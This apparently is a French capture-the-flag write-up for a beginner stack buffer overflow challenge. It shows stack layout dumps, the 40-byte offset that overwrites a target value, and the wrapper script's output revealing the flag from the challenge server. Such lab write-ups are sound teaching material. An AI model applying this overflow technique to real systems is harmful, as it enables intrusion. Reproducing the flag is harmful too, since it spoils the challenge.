# Fichiers fournis par le challenge

* wrapper.py : script python pour bof, modifier les valeurs requires (IP, Port, nombre de A's) et installer pwntools (pip3 install pwntools) 
* flag.txt : Exemple de flag invalide
* gs (ghostscript) : binary instrumenting tool
* ld-linux-x86-64.so.-2 : dynamic linker/loader for Linux systems
* libc.so.6 : shareled library 

# Solution 

Après quelques recherches j'ai exécuté : 

LD_PRELOAD=./libc.so.6 ./ld-linux-x86-64.so.-2 ./GS

et ma donner le output suivant : 

|      .      | <- Higher addresses
|      .      |
|_____________|
|             | <- 64 bytes
| Return addr |
|_____________|
|             | <- 56 bytes
|     RBP     |
|_____________|
|             | <- 48 bytes
|   target    |
|_____________|
|             | <- 40 bytes
|  alignment  |
|_____________|
|             | <- 32 bytes
|  Buffer[31] |
|_____________|
|      .      |
|      .      |
|_____________|
|             |
|  Buffer[0]  |
|_____________| <- Lower addresses


      [Addr]       |      [Value]       
-------------------+-------------------
0x00007ffe8f64a100 | 0x0000000000000000 <- Start of buffer
0x00007ffe8f64a108 | 0x0000000000000000
0x00007ffe8f64a110 | 0x0000000000000000
0x00007ffe8f64a118 | 0x0000000000000000
0x00007ffe8f64a120 | 0x6969696969696969 <- Dummy value for alignment
0x00007ffe8f64a128 | 0x00000000deadbeef <- Target to change
0x00007ffe8f64a130 | 0x00007f53e9739800 <- Saved rbp
0x00007ffe8f64a138 | 0x00007f53e9021c87 <- Saved return address
0x00007ffe8f64a140 | 0x0000000000008000
0x00007ffe8f64a148 | 0x00007ffe8f64a210


After we insert 4 "A"s, (the hex representation of A is 0x41), the stack layout like this:


      [Addr]       |      [Value]       
-------------------+-------------------
0x00007ffe8f64a100 | 0x0000000041414141 <- Start of buffer
0x00007ffe8f64a108 | 0x0000000000000000
0x00007ffe8f64a110 | 0x0000000000000000
0x00007ffe8f64a118 | 0x0000000000000000
0x00007ffe8f64a120 | 0x6969696969696969 <- Dummy value for alignment
0x00007ffe8f64a128 | 0x00000000deadbeef <- Target to change
0x00007ffe8f64a130 | 0x00007f53e9739800 <- Saved rbp
0x00007ffe8f64a138 | 0x00007f53e9021c87 <- Saved return address
0x00007ffe8f64a140 | 0x0000000000008000
0x00007ffe8f64a148 | 0x00007ffe8f64a210


After we insert 4 "B"s, (the hex representation of B is 0x42), the stack layout looks like this:


      [Addr]       |      [Value]       
-------------------+-------------------
0x00007ffe8f64a100 | 0x4242424241414141 <- Start of buffer
0x00007ffe8f64a108 | 0x0000000000000000
0x00007ffe8f64a110 | 0x0000000000000000
0x00007ffe8f64a118 | 0x0000000000000000
0x00007ffe8f64a120 | 0x6969696969696969 <- Dummy value for alignment
0x00007ffe8f64a128 | 0x00000000deadbeef <- Target to change
0x00007ffe8f64a130 | 0x00007f53e9739800 <- Saved rbp
0x00007ffe8f64a138 | 0x00007f53e9021c87 <- Saved return address
0x00007ffe8f64a140 | 0x0000000000008000
0x00007ffe8f64a148 | 0x00007ffe8f64a210

◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
◉                                                                                                 ◉
◉  Fill the 32-byte buffer, overwrite the alginment address and the "target's" 0xdeadbeef value.  ◉
◉                                                                                                 ◉
◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉



___________________________________________________________________________________________________________________________________________________

J'ai vérifier le nombre de bytes a inséré pour le bof, j'ai commencer par 39 suivi de 40 et a fini par recevoir ce output par le script wrapper.py : 

python3 ./wrapper.py 
[+] Opening connection to 209.97.134.50 on port 30135: Done
[+] Flag --> HTB{b0f_s33m5_3z_r1ght?}
[*] Closed connection to 209.97.134.50 port 30135

